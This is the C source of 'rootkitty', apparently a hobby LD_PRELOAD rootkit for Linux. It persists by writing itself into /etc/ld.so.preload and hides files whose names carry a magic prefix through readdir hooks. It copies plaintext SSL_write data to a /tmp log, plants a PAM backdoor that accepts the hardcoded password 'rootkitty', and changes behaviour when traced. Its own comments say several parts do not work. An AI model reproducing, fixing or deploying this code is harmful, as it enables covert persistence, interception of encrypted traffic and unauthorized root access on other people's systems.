/*---------[ PREPROCESSOR ]---------*/
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#define STR_LEN(str) sizeof(str)-1
#define MAGIC_PREFIX "rootkitty"
#define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
#ifndef PAM_EXTERN
#define PAM_EXTERN extern 
#endif

/*---------[ PROTOTYPES ]---------*/
static struct dirent*   (*og_readdir)(DIR *)       = NULL;
static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
static int (*og_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
static int (*og_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
static int (*og_pam_open_session)(pam_handle_t *pamh, int flags) = NULL; 
int isDebuggerPresent();

/*---------[ INITIALIZE THE HOOKS ]---------*/
__attribute__((constructor)) void hook_init(void){
  og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
  og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
  printf("[+] readdir64 hooked\n");
  if (dlerror() != NULL) {
    fprintf(stderr, "Error: %s\n", dlerror());
    exit(EXIT_FAILURE);
  }
  og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
  og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
  og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
  og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
  og_execve = (int (*)(const char*, char *const argv[], char *const envp[]))dlsym(RTLD_NEXT, "execve");
  og_pam_acct_mgmt = (int (*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_acct_mgmt");
  og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
}

/*---------[ PERSISTENCE CHECK AND LD.SO.PRELOAD MANIPULATION ]---------*/
// doesnt work
__attribute__((constructor)) void PersistCheck(void) {
  FILE* fd;
  FILE* temp_fd;
  Dl_info path;
  char line[255];
  char check[PATH_MAX];
  char* preload = "/etc/ld.so.preload";
  char* tmp = "/tmp/rootkitty_tmp.txt"; 
  if(!isDebuggerPresent()){
    return;
  }

  dladdr((void*)PersistCheck, &path);
  uid_t old_uid = getuid();
  seteuid(0);
  
  if (access(preload, F_OK) == 0){
    fd = fopen(preload, "r");
    if(fd == NULL) return;
    
    if (fgets(check, sizeof(check), fd) && strcmp(check, path.dli_fname) == 0){
      fclose(fd);
      return;
    }
    
    temp_fd = fopen(tmp, "w");
    if(temp_fd == NULL) {
      fclose(fd);
      return;
    }

    fprintf(temp_fd, "%s\n", path.dli_fname);

    while (fgets(line, sizeof(line), fd) != NULL) {
      fprintf(temp_fd, "%s", line);
    }

    fclose(fd);
    fclose(temp_fd);
    rename(tmp, preload);
  } else {
    fd = fopen(preload, "w");
    if (fd != NULL) {
      fprintf(fd, "%s\n", path.dli_fname);
      fclose(fd);
    }
  }
  seteuid(old_uid);
}

/*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
// probably doesnt work
int execve(const char *pathname, char *const argv[], char *const envp[]) {
  char* ldd = "/bin/ldd";
  char* unhide = "/bin/unhide";
  char* normal = "/etc/ld.so.preload";
  char* hidden = "/etc/.ld.so.preload";

  if (strcmp(pathname,ldd)==0 || strcmp(pathname,unhide)==0) {
    uid_t old_uid = getuid();
    seteuid(0);
    rename(normal, hidden);  // Hide file
    sleep(2);
    rename(hidden, normal); // Restore file
    seteuid(old_uid);
  }
  return og_execve(pathname, argv, envp);
}
/*---------[ HIDING FILES ]---------*/
struct dirent* readdir(DIR *dirp){
  struct dirent* entry;
  while ((entry = og_readdir(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;    
    }
    return entry;
  }
  return entry;
}
// handle 64bit version
// DOESNT FUCKING WORK
struct dirent64* readdir64(DIR* dirp) {
  struct dirent64* entry;
  while ((entry = og_readdir64(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;
    }
    return entry;
  }
  return entry;
}

/*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
int SSL_write(SSL* ssl, const void *buf, int num) {
  char path[] = "/tmp/rootkitty_SSLlog.txt";

  if (!isDebuggerPresent()){
    return og_SSL_write(ssl, buf, num);
  }

  FILE* fd = fopen(path, "a+");
  
  if (fd != NULL){
    fprintf(fd, "PID:%d\n", getpid());
    fwrite(buf, 1, num, fd);
    fprintf(fd, "\n");
    fclose(fd);
  }
  return og_SSL_write(ssl, buf, num);
}
/*---------[ PAM BACKDOOR ]---------*/
// DOESNT WORK
int backdoor = 0;

// elevate privileges:
int elevation(){
  if (!isDebuggerPresent()){
    return 1;
  }
  uid_t UID = getuid();
  gid_t GID = getgid();

  if (seteuid(0) == -1) {
    return 1;
  }
  if (setegid(0) == -1) {
    seteuid(UID);
    return 1;
  }
  return 0;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
  const char* input_passwd;
  
  if(!isDebuggerPresent()){
    return og_pam_sm_auth(pamh, flags, argc, argv);
  }

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
  char* password = "rootkitty";
  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }
  return og_pam_sm_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
  if (isDebuggerPresent() && backdoor == 1){
    if(elevation() == 0){
      backdoor = 0;
      return PAM_SUCCESS;
    }
  }
  return og_pam_sm_setcred(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
  const char* input_passwd;

  if (!isDebuggerPresent()){
    return og_pam_auth(pamh, flags);
  }
  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
  char* password = "rootkitty";
  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }
  return og_pam_auth(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags){
  const char* input_passwd;

  if (!isDebuggerPresent()){
    return og_pam_acct_mgmt(pamh, flags);
  }

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
  char* password = "rootkitty";
  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }

  return og_pam_acct_mgmt(pamh, flags); 
}

int pam_open_session(pam_handle_t *pamh, int flags) {
const char* input_passwd;

  if (!isDebuggerPresent()){
    return og_pam_open_session(pamh, flags);
  }

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
  char* password = "rootkitty";
  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }
  return og_pam_open_session(pamh, flags);
}

/*---------[ ANTI DEBUGGER CHECK ]---------*/
int isDebuggerPresent(){
  FILE* f;
  char buffer[1024];
  int result = 0;
  int pid = 0;

  f = fopen("/proc/self/status", "r");
  if (f == NULL) {
    perror("[-] Cannot open file.");
    exit(EXIT_FAILURE);
  }

  while (fgets(buffer, sizeof(buffer), f)) {
    if (strncmp(buffer, "TracerPid:", 10)==0){
      pid = atoi(buffer+10);
      if (!pid) {
        result = 1;
        break;
      }
    }
  }
  fclose(f);
  return result;
}
